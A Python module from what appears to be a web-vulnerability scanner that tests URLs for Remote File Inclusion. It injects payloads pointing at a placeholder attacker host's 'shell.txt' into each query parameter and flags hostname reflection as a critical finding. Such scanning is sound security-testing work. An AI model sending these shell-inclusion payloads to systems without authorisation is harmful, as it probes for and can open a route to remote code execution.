"""Remote File Inclusion scanner."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

RFI_PAYLOADS = [
    "http://evil.example.com/shell.txt",
    "https://evil.example.com/shell.txt",
    "http://127.0.0.1:8765/shell.txt",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        for payload in RFI_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = get(new_url)
            if r.status != 0 and "evil.example.com" in (r.text or ""):
                findings.append(Finding(
                    id="rfi-{}-{}".format(param, hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="Remote File Inclusion",
                    severity="critical",
                    url=new_url,
                    parameter=param,
                    payload=payload,
                    evidence="Remote content reflected",
                    response_snippet=r.snippet(300),
                    confidence=0.7,
                ))
                break
    log_event(parsed.netloc, "rfi_scan", {"url": url, "findings": len(findings)})
    return findings
